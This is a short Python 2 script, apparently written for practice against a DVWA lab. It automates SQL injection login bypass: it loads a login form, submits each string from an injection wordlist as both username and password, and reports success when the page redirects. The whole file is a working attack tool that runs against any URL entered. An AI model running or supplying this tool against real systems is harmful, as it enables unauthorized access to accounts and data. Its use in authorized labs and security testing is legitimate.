print "----------------SQL INJECTION TESTER--------------"
print "Inspect the login form for details to use this method"
print "------------------------------------------------"
import mechanize

data=mechanize.Browser()
#url='http://192.168.56.101/dvwa/login.php'
url=raw_input("Enter the url:")

wordlist=raw_input("Enter the sql injections file:")
#wordlist='rockyou.txt'
try:
    wordlist=open(wordlist,'r')
    wordlist=wordlist.read()
    wordlist=wordlist.split()
except:
    print "\n!!!Wordlist not found!!!"
    quit()

print "--------Login Form name-------"
print "*Enter for 1 no name"
fname=raw_input("Enter name of loginform:")



print "-------------Select Method Type-----------"
print "GET "
print "POST "   
print "------------------------------------------"

mname=raw_input("Please select one:")


uname=raw_input("Enter name field of userid:")
pname=raw_input("Enter name field of password:")

for injection in wordlist:
    response=data.open(url)
    if fname =='1':
   	data.select_form(nr=0)
    else:
	data.select_form(fname)
    data.form[uname]=injection
    data.form[pname]=injection
    data.method=mname
    response=data.submit()

    if response.geturl() == url : 
	print "Checking:%s"%injection
    else :
	print "Password Found:%s"%injection
        break
        
